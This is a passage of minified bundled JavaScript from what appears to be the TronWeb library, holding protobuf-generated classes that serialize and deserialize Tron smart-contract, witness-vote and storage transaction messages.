                    n.setTokenId(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.TriggerSmartContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.TriggerSmartContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getContractAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getCallValue(),
            a !== 0 && s.writeInt64(3, a),
            a = n.getData_asU8(),
            a.length > 0 && s.writeBytes(4, a),
            a = n.getCallTokenValue(),
            a !== 0 && s.writeInt64(5, a),
            a = n.getTokenId(),
            a !== 0 && s.writeInt64(6, a)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getContractAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getContractAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractAddress())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getContractAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractAddress())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setContractAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getCallValue = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setCallValue = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getData = function() {
            return e.Message.getFieldWithDefault(this, 4, "")
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getData_asB64 = function() {
            return e.Message.bytesAsB64(this.getData())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getData_asU8 = function() {
            return e.Message.bytesAsU8(this.getData())
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setData = function(n) {
            return e.Message.setProto3BytesField(this, 4, n)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getCallTokenValue = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setCallTokenValue = function(n) {
            return e.Message.setProto3IntField(this, 5, n)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.getTokenId = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.TriggerSmartContract.prototype.setTokenId = function(n) {
            return e.Message.setProto3IntField(this, 6, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ClearABIContract.prototype.toObject = function(n) {
            return TronWebProto.ClearABIContract.toObject(n, this)
        }
        ,
        TronWebProto.ClearABIContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                contractAddress: s.getContractAddress_asB64()
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.ClearABIContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.ClearABIContract;
            return TronWebProto.ClearABIContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.ClearABIContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setContractAddress(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.ClearABIContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.ClearABIContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.ClearABIContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getContractAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a)
        }
        ,
        TronWebProto.ClearABIContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ClearABIContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ClearABIContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ClearABIContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.ClearABIContract.prototype.getContractAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.ClearABIContract.prototype.getContractAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractAddress())
        }
        ,
        TronWebProto.ClearABIContract.prototype.getContractAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractAddress())
        }
        ,
        TronWebProto.ClearABIContract.prototype.setContractAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateSettingContract.prototype.toObject = function(n) {
            return TronWebProto.UpdateSettingContract.toObject(n, this)
        }
        ,
        TronWebProto.UpdateSettingContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                contractAddress: s.getContractAddress_asB64(),
                consumeUserResourcePercent: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.UpdateSettingContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.UpdateSettingContract;
            return TronWebProto.UpdateSettingContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.UpdateSettingContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setContractAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setConsumeUserResourcePercent(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.UpdateSettingContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.UpdateSettingContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getContractAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getConsumeUserResourcePercent(),
            a !== 0 && s.writeInt64(3, a)
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getContractAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getContractAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractAddress())
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getContractAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractAddress())
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.setContractAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.getConsumeUserResourcePercent = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.UpdateSettingContract.prototype.setConsumeUserResourcePercent = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateEnergyLimitContract.prototype.toObject = function(n) {
            return TronWebProto.UpdateEnergyLimitContract.toObject(n, this)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.toObject = function(n, s) {
            var a = {
                ownerAddress: s.getOwnerAddress_asB64(),
                contractAddress: s.getContractAddress_asB64(),
                originEnergyLimit: e.Message.getFieldWithDefault(s, 3, 0)
            };
            return n && (a.$jspbMessageInstance = s),
            a
        }
        ),
        TronWebProto.UpdateEnergyLimitContract.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.UpdateEnergyLimitContract;
            return TronWebProto.UpdateEnergyLimitContract.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = s.readBytes();
                    n.setOwnerAddress(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setContractAddress(l);
                    break;
                case 3:
                    var l = s.readInt64();
                    n.setOriginEnergyLimit(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.UpdateEnergyLimitContract.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getOwnerAddress_asU8(),
            a.length > 0 && s.writeBytes(1, a),
            a = n.getContractAddress_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getOriginEnergyLimit(),
            a !== 0 && s.writeInt64(3, a)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.setOwnerAddress = function(n) {
            return e.Message.setProto3BytesField(this, 1, n)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getContractAddress())
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getContractAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getContractAddress())
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.setContractAddress = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.getOriginEnergyLimit = function() {
            return e.Message.getFieldWithDefault(this, 3, 0)
        }
        ,
        TronWebProto.UpdateEnergyLimitContract.prototype.setOriginEnergyLimit = function(n) {
            return e.Message.setProto3IntField(this, 3, n)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContractDataWrapper.prototype.toObject = function(n) {
            return TronWebProto.SmartContractDataWrapper.toObject(n, this)
        }
        ,
        TronWebProto.SmartContractDataWrapper.toObject = function(n, s) {
            var a, l = {
                smartContract: (a = s.getSmartContract()) && TronWebProto.SmartContract.toObject(n, a),
                runtimecode: s.getRuntimecode_asB64(),
                contractState: (a = s.getContractState()) && TronWebProto.ContractState.toObject(n, a)
            };
            return n && (l.$jspbMessageInstance = s),
            l
        }
        ),
        TronWebProto.SmartContractDataWrapper.deserializeBinary = function(n) {
            var s = new e.BinaryReader(n)
              , a = new TronWebProto.SmartContractDataWrapper;
            return TronWebProto.SmartContractDataWrapper.deserializeBinaryFromReader(a, s)
        }
        ,
        TronWebProto.SmartContractDataWrapper.deserializeBinaryFromReader = function(n, s) {
            for (; s.nextField() && !s.isEndGroup(); ) {
                var a = s.getFieldNumber();
                switch (a) {
                case 1:
                    var l = new TronWebProto.SmartContract;
                    s.readMessage(l, TronWebProto.SmartContract.deserializeBinaryFromReader),
                    n.setSmartContract(l);
                    break;
                case 2:
                    var l = s.readBytes();
                    n.setRuntimecode(l);
                    break;
                case 3:
                    var l = new TronWebProto.ContractState;
                    s.readMessage(l, TronWebProto.ContractState.deserializeBinaryFromReader),
                    n.setContractState(l);
                    break;
                default:
                    s.skipField();
                    break
                }
            }
            return n
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.serializeBinary = function() {
            var n = new e.BinaryWriter;
            return TronWebProto.SmartContractDataWrapper.serializeBinaryToWriter(this, n),
            n.getResultBuffer()
        }
        ,
        TronWebProto.SmartContractDataWrapper.serializeBinaryToWriter = function(n, s) {
            var a = void 0;
            a = n.getSmartContract(),
            a != null && s.writeMessage(1, a, TronWebProto.SmartContract.serializeBinaryToWriter),
            a = n.getRuntimecode_asU8(),
            a.length > 0 && s.writeBytes(2, a),
            a = n.getContractState(),
            a != null && s.writeMessage(3, a, TronWebProto.ContractState.serializeBinaryToWriter)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.getSmartContract = function() {
            return e.Message.getWrapperField(this, TronWebProto.SmartContract, 1)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.setSmartContract = function(n) {
            return e.Message.setWrapperField(this, 1, n)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.clearSmartContract = function() {
            return this.setSmartContract(void 0)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.hasSmartContract = function() {
            return e.Message.getField(this, 1) != null
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode_asB64 = function() {
            return e.Message.bytesAsB64(this.getRuntimecode())
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.getRuntimecode_asU8 = function() {
            return e.Message.bytesAsU8(this.getRuntimecode())
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.setRuntimecode = function(n) {
            return e.Message.setProto3BytesField(this, 2, n)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.getContractState = function() {
            return e.Message.getWrapperField(this, TronWebProto.ContractState, 3)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.setContractState = function(n) {
            return e.Message.setWrapperField(this, 3, n)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.clearContractState = function() {
            return this.setContractState(void 0)
        }
        ,
        TronWebProto.SmartContractDataWrapper.prototype.hasContractState = function() {
            return e.Message.getField(this, 3) != null
        }
        ,
        t.object.extend(r, TronWebProto)
    }(ZT)),
    ZT
}
Bge();
AU();
var YT = {}, bW;
function _ge() {
    return bW || (bW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.VoteWitnessContract", null, o),
        t.exportSymbol("TronWebProto.VoteWitnessContract.Vote", null, o),
        t.exportSymbol("TronWebProto.WitnessCreateContract", null, o),
        t.exportSymbol("TronWebProto.WitnessUpdateContract", null, o),
        TronWebProto.WitnessCreateContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.WitnessCreateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.WitnessCreateContract.displayName = "TronWebProto.WitnessCreateContract"),
        TronWebProto.WitnessUpdateContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.WitnessUpdateContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.WitnessUpdateContract.displayName = "TronWebProto.WitnessUpdateContract"),
        TronWebProto.VoteWitnessContract = function(i) {
            e.Message.initialize(this, i, 0, -1, TronWebProto.VoteWitnessContract.repeatedFields_, null)
        }
        ,
        t.inherits(TronWebProto.VoteWitnessContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.VoteWitnessContract.displayName = "TronWebProto.VoteWitnessContract"),
        TronWebProto.VoteWitnessContract.Vote = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.VoteWitnessContract.Vote, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.VoteWitnessContract.Vote.displayName = "TronWebProto.VoteWitnessContract.Vote"),
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.WitnessCreateContract.prototype.toObject = function(i) {
            return TronWebProto.WitnessCreateContract.toObject(i, this)
        }
        ,
        TronWebProto.WitnessCreateContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                url: n.getUrl_asB64()
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.WitnessCreateContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.WitnessCreateContract;
            return TronWebProto.WitnessCreateContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.WitnessCreateContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setUrl(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.WitnessCreateContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.WitnessCreateContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getUrl_asU8(),
            s.length > 0 && n.writeBytes(2, s)
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getUrl = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getUrl_asB64 = function() {
            return e.Message.bytesAsB64(this.getUrl())
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.getUrl_asU8 = function() {
            return e.Message.bytesAsU8(this.getUrl())
        }
        ,
        TronWebProto.WitnessCreateContract.prototype.setUrl = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.WitnessUpdateContract.prototype.toObject = function(i) {
            return TronWebProto.WitnessUpdateContract.toObject(i, this)
        }
        ,
        TronWebProto.WitnessUpdateContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                updateUrl: n.getUpdateUrl_asB64()
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.WitnessUpdateContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.WitnessUpdateContract;
            return TronWebProto.WitnessUpdateContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.WitnessUpdateContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 12:
                    var a = n.readBytes();
                    i.setUpdateUrl(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.WitnessUpdateContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.WitnessUpdateContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getUpdateUrl_asU8(),
            s.length > 0 && n.writeBytes(12, s)
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl = function() {
            return e.Message.getFieldWithDefault(this, 12, "")
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl_asB64 = function() {
            return e.Message.bytesAsB64(this.getUpdateUrl())
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.getUpdateUrl_asU8 = function() {
            return e.Message.bytesAsU8(this.getUpdateUrl())
        }
        ,
        TronWebProto.WitnessUpdateContract.prototype.setUpdateUrl = function(i) {
            return e.Message.setProto3BytesField(this, 12, i)
        }
        ,
        TronWebProto.VoteWitnessContract.repeatedFields_ = [2],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.VoteWitnessContract.prototype.toObject = function(i) {
            return TronWebProto.VoteWitnessContract.toObject(i, this)
        }
        ,
        TronWebProto.VoteWitnessContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                votesList: e.Message.toObjectList(n.getVotesList(), TronWebProto.VoteWitnessContract.Vote.toObject, i),
                support: e.Message.getBooleanFieldWithDefault(n, 3, !1)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.VoteWitnessContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.VoteWitnessContract;
            return TronWebProto.VoteWitnessContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.VoteWitnessContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = new TronWebProto.VoteWitnessContract.Vote;
                    n.readMessage(a, TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader),
                    i.addVotes(a);
                    break;
                case 3:
                    var a = n.readBool();
                    i.setSupport(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.VoteWitnessContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.VoteWitnessContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getVotesList(),
            s.length > 0 && n.writeRepeatedMessage(2, s, TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter),
            s = i.getSupport(),
            s && n.writeBool(3, s)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.VoteWitnessContract.Vote.prototype.toObject = function(i) {
            return TronWebProto.VoteWitnessContract.Vote.toObject(i, this)
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.toObject = function(i, n) {
            var s = {
                voteAddress: n.getVoteAddress_asB64(),
                voteCount: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.VoteWitnessContract.Vote.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.VoteWitnessContract.Vote;
            return TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setVoteAddress(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setVoteCount(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getVoteAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getVoteCount(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getVoteAddress())
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.getVoteAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getVoteAddress())
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.setVoteAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.getVoteCount = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.VoteWitnessContract.Vote.prototype.setVoteCount = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.getVotesList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.VoteWitnessContract.Vote, 2)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.setVotesList = function(i) {
            return e.Message.setRepeatedWrapperField(this, 2, i)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.addVotes = function(i, n) {
            return e.Message.addToRepeatedWrapperField(this, 2, i, TronWebProto.VoteWitnessContract.Vote, n)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.clearVotesList = function() {
            return this.setVotesList([])
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.getSupport = function() {
            return e.Message.getBooleanFieldWithDefault(this, 3, !1)
        }
        ,
        TronWebProto.VoteWitnessContract.prototype.setSupport = function(i) {
            return e.Message.setProto3BooleanField(this, 3, i)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(YT)),
    YT
}
_ge();
var XT = {}, mW;
function Ige() {
    return mW || (mW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")();
        t.exportSymbol("TronWebProto.BuyStorageBytesContract", null, o),
        t.exportSymbol("TronWebProto.BuyStorageContract", null, o),
        t.exportSymbol("TronWebProto.SellStorageContract", null, o),
        t.exportSymbol("TronWebProto.UpdateBrokerageContract", null, o),
        TronWebProto.BuyStorageBytesContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.BuyStorageBytesContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.BuyStorageBytesContract.displayName = "TronWebProto.BuyStorageBytesContract"),
        TronWebProto.BuyStorageContract = function(i) {
            e.Message.initialize(this, i, 0, -1, null, null)
        }
